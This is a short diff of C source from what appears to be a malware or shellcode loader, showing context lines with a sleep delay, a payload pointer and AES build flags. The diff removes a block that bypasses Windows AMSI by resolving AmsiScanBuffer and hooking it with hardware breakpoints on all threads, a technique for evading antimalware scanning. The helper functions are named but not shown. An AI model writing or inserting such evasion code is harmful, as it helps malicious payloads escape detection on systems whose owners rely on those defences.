@@ -15,46 +15,6 @@ int main() {
 
     Sleep( DELAY * 1000 );
 
-    #ifdef BYPASS_AMSI
-    PVOID pvAmsiScanBuf = NULL;
-
-    if ( ! LoadLibraryA( "AMSI" ) ) {
-        #ifdef DEBUG
-        printf( "[-] LoadLibraryA Failed With Error -> %d\n", GetLastError());
-        #endif // !DEBUG
-        
-        return 1;
-    }
-
-    if ( ! ( pvAmsiScanBuf = GetProcAddress( GetModuleHandleA( "AMSI" ), "AmsiScanBuffer" ) ) ) {
-        #ifdef DEBUG
-        printf( "[-] GetProcAddress Failed With Error -> %d\n", GetLastError());
-        #endif // !DEBUG
-        
-        return 1;
-    }
-
-    if ( ! InitHardwareBreakpointHooking() ) {
-        #ifdef DEBUG
-        printf( "[-] Failed to Init Hooking\n");
-        #endif // !DEBUG
-        
-        return 1;
-    }
-
-    if ( ! InstallHardwareBreakingPntHook( ( PUINT_VAR_T ) pvAmsiScanBuf, Dr0, AmsiScanBufDetour, ALL_THREADS ) ) {
-        #ifdef DEBUG
-        printf( "[-] Failed to Install Hooks\n");
-        #endif // !DEBUG
-        
-        return 1;
-    }
-
-    if ( ! InstallHooksOnNewThreads( Dr1 ) ) {
-        return 1;
-    }
-    #endif
-
     PBYTE* pbPayload = NULL;
 
     #ifdef AES
